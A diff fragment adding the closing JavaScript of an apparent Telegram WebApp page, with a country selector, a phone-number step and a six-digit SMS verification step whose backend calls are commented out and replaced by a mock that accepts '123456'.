+  `).join("");
+
+  countryList.querySelectorAll(".country-item").forEach(el => {
+    el.addEventListener("click", () => {
+      const country = COUNTRIES.find(c => c.страна === el.dataset.name);
+      if (country) {
+        setCountry(country);
+        closeModal();
+      }
+    });
+  });
+}
+
+function openModal() {
+  searchInput.value = "";
+  renderCountries();
+  modal.classList.add("open");
+  setTimeout(() => searchInput.focus(), 300);
+}
+
+function closeModal() {
+  modal.classList.remove("open");
+}
+
+$("country-selector").addEventListener("click", openModal);
+$("modal-close").addEventListener("click", closeModal);
+modal.addEventListener("click", (e) => {
+  if (e.target === modal) closeModal();
+});
+searchInput.addEventListener("input", () => renderCountries(searchInput.value));
+
+/* Continue */
+btnContinue.addEventListener("click", async () => {
+  if (btnContinue.disabled || btnContinue.classList.contains("loading")) return;
+
+  const fullPhone = currentCountry.индекс + phoneDigits;
+  btnContinue.classList.add("loading");
+  phoneError.classList.remove("visible");
+
+  try {
+    // const res = await fetch("/api/send_sms", {
+    //   method: "POST",
+    //   headers: { "Content-Type": "application/json" },
+    //   body: JSON.stringify({ phone: fullPhone })
+    // });
+    // const data = await res.json();
+    // if (!res.ok) throw new Error(data.error || "Ошибка отправки");
+
+    // MOCK
+    await new Promise(r => setTimeout(r, 1500));
+
+    $("sent-phone").textContent = fullPhone;
+    $("screen-phone").classList.remove("active");
+    $("screen-code").classList.add("active");
+    startTimer();
+    document.querySelectorAll(".code-digit")[0].focus();
+
+  } catch (err) {
+    phoneError.textContent = err.message || "Не удалось отправить код. Попробуйте позже.";
+    phoneError.classList.add("visible");
+  } finally {
+    btnContinue.classList.remove("loading");
+  }
+});
+
+/* ===== Code screen (6 digits) ===== */
+const codeDigits = document.querySelectorAll(".code-digit");
+const btnVerify = $("btn-verify");
+const codeError = $("code-error");
+let timerInterval = null;
+let timerSeconds = 60;
+
+codeDigits.forEach((input, idx) => {
+  input.addEventListener("input", (e) => {
+    const val = e.target.value.replace(/\D/g, "");
+    e.target.value = val.slice(0, 1);
+
+    if (val && idx < codeDigits.length - 1) {
+      codeDigits[idx + 1].focus();
+    }
+    checkCodeComplete();
+  });
+
+  input.addEventListener("keydown", (e) => {
+    if (e.key === "Backspace" && !e.target.value && idx > 0) {
+      codeDigits[idx - 1].focus();
+    }
+  });
+
+  input.addEventListener("paste", (e) => {
+    e.preventDefault();
+    const paste = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "").slice(0, 6);
+    paste.split("").forEach((ch, i) => {
+      if (codeDigits[i]) codeDigits[i].value = ch;
+    });
+    if (paste.length > 0) {
+      codeDigits[Math.min(paste.length, 5)].focus();
+    }
+    checkCodeComplete();
+  });
+});
+
+function checkCodeComplete() {
+  const code = Array.from(codeDigits).map(i => i.value).join("");
+  btnVerify.disabled = code.length < 6;
+}
+
+btnVerify.addEventListener("click", async () => {
+  if (btnVerify.disabled || btnVerify.classList.contains("loading")) return;
+
+  const code = Array.from(codeDigits).map(i => i.value).join("");
+  btnVerify.classList.add("loading");
+  codeError.classList.remove("visible");
+
+  try {
+    // const res = await fetch("/api/verify_code", {
+    //   method: "POST",
+    //   headers: { "Content-Type": "application/json" },
+    //   body: JSON.stringify({
+    //     phone: currentCountry.индекс + phoneDigits,
+    //     code: code
+    //   })
+    // });
+    // const data = await res.json();
+    // if (!res.ok) throw new Error(data.error || "Неверный код");
+
+    // MOCK
+    await new Promise(r => setTimeout(r, 1200));
+    if (code !== "123456") throw new Error("Неверный код подтверждения");
+
+    Telegram.WebApp.showAlert("Успешно! Код подтверждён.");
+
+  } catch (err) {
+    codeError.textContent = err.message || "Ошибка проверки кода";
+    codeError.classList.add("visible");
+  } finally {
+    btnVerify.classList.remove("loading");
+  }
+});
+
+/* Resend timer */
+function startTimer() {
+  timerSeconds = 60;
+  $("resend-block").innerHTML = `Отправить код повторно через <span id="timer">${timerSeconds}</span> сек`;
+  clearInterval(timerInterval);
+
+  timerInterval = setInterval(() => {
+    timerSeconds--;
+    const t = $("timer");
+    if (t) t.textContent = timerSeconds;
+
+    if (timerSeconds <= 0) {
+      clearInterval(timerInterval);
+      $("resend-block").innerHTML = `<a href="#" id="resend-link">Отправить код повторно</a>`;
+      $("resend-link").addEventListener("click", (e) => {
+        e.preventDefault();
+        startTimer();
+      });
+    }
+  }, 1000);
+}
+
+/* Start */
+setCountry(currentCountry);
+</script>
+</body>
+</html>
